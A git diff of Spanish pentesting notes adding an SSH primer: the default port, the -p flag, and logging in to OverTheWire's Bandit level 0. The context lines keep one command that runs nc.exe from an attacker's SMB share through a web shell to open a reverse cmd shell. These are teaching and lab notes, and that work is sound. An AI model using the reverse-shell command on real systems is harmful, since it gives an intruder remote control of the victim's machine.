@@ -129,3 +129,52 @@ Ejecutar nc.exe a través del navegador, tendremos que especificar una direccion
     http://10.10.10.198:8080/upload/kamehameha.php?telepathy=\\10.10.14.75\smbFolder\nc.exe -e cmd [Ip Atacante] [Puerto en Escucha]
     
     
+---
+
+
+    
+# SSH
+
+## Puerto predeterminado SSH:
+
+La comunicación inalámbrica o por cable entre dos máquinas se realiza a través de puertos. Hay un total de 65,536 puertos de comunicación y la 
+comunicación puede tener lugar a través de cualquiera de estos puertos. SSH se comunica por defecto a través del puerto 22. Cuando ejecutamos el 
+comando anterior, la conexión entre el cliente local y el servidor se establece a través del puerto 22 y toda la comunicación se realiza a través 
+de este puerto.
+
+## Especificar puerto de conexión con SSH
+
+En ocaciones, ``se puede modificar el puerto por el cual se conecta SSH``. En caso de no especificar ningún puerto SSH se conectará por defecto por
+el puerto 22. En caso de querer especificar otro puerto lo podemo hacer con la opción ``-p`` seguido del puerto en cuestion.
+
+
+    ssh [Usuario]@[Dirección] -p [Puerto]
+    
+    
+# Ejemplo de conexión SSH:
+
+Para realizar un ejemplo de como conectarno a otro equipo utilizando SSH vamos a utilizar la web ``https://overthewire.org``. Está página está 
+enfocada en enseñar los parámetros básicos de Linux y SSH a través de distintos laboratorios. A estos laboratorios nos conetaremos a través de
+SSH y la finalidad de cada practica es encontrar la flag secreta oculta en cada sistema. La flag encontrada es la contraseña para poder conectarnos
+al siguiente nivel. 
+
+En este ejemplo únicamente mostraremos como conectarnos a través de SSH, para ver todas practicas de ``OverTheWire`` podeís encontrarlas en la 
+sección de Laboratorios.
+
+En primer lugar abrimos la página oficial de Over The Wire:
+
+Una vez abierta nos dirigimos al ``Nivel 0``:
+
+Vemos como nos dice que el nombre del usuario es ``bandit0`` que la contraseña es ``bandit0`` también, la dirección es ``bandit.labs.overthewire.org´´
+y nos indica que debemos utilizar el ``puerto 2220``:
+
+
+    ssh bandit0@bandit.labs.overthewire.org -p 2220 
+    
+Una vez ejeuctado el comando anterior, nos pedirá la contraseña.     
+
+
+
+
+
+    
